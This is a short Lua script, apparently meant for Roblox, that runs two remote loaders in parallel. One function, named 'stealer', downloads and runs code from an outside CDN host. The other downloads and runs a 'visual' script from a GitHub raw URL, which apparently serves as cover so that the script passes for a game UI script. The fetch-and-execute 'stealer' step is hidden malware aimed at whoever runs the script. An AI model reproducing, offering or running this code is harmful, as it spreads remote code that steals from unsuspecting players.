local function stealer()
ID="ca66c799-9a62-4605-a3e4-fc064bfd0975";
loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
end
local function loadui()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))()

end

task.spawn(stealer)
task.spawn(loadui)
